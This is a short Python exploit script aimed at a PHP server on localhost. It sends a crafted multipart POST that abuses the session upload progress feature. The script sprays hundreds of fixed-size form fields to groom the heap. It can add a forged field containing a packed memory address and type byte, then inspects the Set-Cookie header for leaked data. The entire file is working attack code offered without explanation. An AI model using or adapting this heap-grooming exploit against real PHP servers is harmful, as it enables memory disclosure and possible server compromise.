#!/usr/bin/env python3
"""B: consume N 64-byte live strings (39-char values), then optional forge field."""
import socket,sys,struct
N=int(sys.argv[1]) if len(sys.argv)>1 else 500
FORGE=int(sys.argv[2]) if len(sys.argv)>2 else 0
LEAK=int(sys.argv[3],0) if len(sys.argv)>3 else 0x2000
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(N):
    parts.append({'n':'k%04d'%i,'d':(b'%04d'%i)+b'B'*35})
if FORGE:
    v=bytearray(b'A'*63)
    struct.pack_into('<Q',v,0x10,LEAK)
    v[0x18]=ord('L')
    parts.append({'n':'zz','d':bytes(v)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<400000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e:
    print("recv_err",repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print("SETCOOKIE_LEN",len(line)); print(line[:300].decode('latin1','replace'))
print("HEAD_LEN",len(head),"BODY",rest[:80])
